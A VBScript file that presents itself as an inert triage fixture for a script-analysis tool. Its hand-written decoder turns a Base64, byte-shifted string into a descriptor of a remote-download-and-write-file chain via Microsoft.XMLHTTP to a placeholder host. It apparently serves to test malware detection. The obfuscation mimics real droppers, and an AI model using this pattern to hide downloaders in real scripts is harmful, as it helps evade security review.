Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_ffd402b9 = "fkU5hHt8bXh7RWlreX1xem1nem11d3xtNH96cXxtZ25xdG2EaWxpeHxtekVVcWt6d3t3bnw2YFVUUFxcWIR7fGlvbWdrd312fEU6hGtpdXhpcW92Z3FsRWtpdXhpcW92NW1raT9pO25uO22EfXp0RXB8fHh7Qjc3bWtpP2k7bm47bTZtgGl1eHRtNnF2fml0cWw3PjlqQD9rP2w2bGl8hH17bXpnaW9tdnxFUH12fHpte3tUaWo3bWtpP2k7bm47bYRucXRtZ3hpfHBFS0JkXXttentkWH1qdHFrZFB9dnx6bXt7VGlqZHt8aW9tNW1raT9pO25uO202bGl8"
Const Codec_ffd402b9 = "base64_literal|add_modulo_256|08"

Function Base64_ffd402b9(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_ffd402b9", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_ffd402b9 = outputBytes
End Function

Function Load_ffd402b9()
  Load_ffd402b9 = Base64_ffd402b9(Material_ffd402b9)
End Function

Function Decode_ffd402b9(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = (SoUrCeByTeS(ByTeInDeX) - 8 + 256) Mod 256
  Next
  Decode_ffd402b9 = result
End Function

Function Recover_ffd402b9()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  NeUtRaL = Empty

  SoUrCeByTeS = Load_ffd402b9()

  PaSs = 0

  While PaSs < 1

    DeCoDeDByTeS = Decode_ffd402b9(SoUrCeByTeS)

    PaSs = PaSs + 1

  Wend

  DeScRiPtOrTeXt = ""

  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)

    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))

  Next
  Recover_ffd402b9 = DeScRiPtOrTeXt
End Function

Sub Copy_ffd402b9(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_ffd402b9()
  Dim resultText
  Call Copy_ffd402b9(Recover_ffd402b9(), resultText)
  Inspect_ffd402b9 = resultText
End Function
